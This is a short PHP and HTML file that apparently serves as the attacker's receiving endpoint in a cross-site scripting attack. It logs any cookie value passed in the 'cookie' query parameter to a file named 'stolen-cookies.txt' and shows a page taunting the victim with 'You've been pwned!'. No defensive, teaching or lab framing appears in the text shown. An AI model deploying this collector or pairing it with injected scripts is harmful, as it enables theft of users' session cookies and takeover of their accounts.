<?php

if (isset($_GET['cookie']))
{
	$file = 'stolen-cookies.txt';
	file_put_contents($file, $_GET['cookie'].PHP_EOL, FILE_APPEND);
}

?>

<!DOCTYPE html>
<html>
	<head>
		<meta>
		<title>XSS</title>
	</head>
	<body>
		<h1 align="center"> XSS - You've been pwned! </h1>
	</body>
</html>
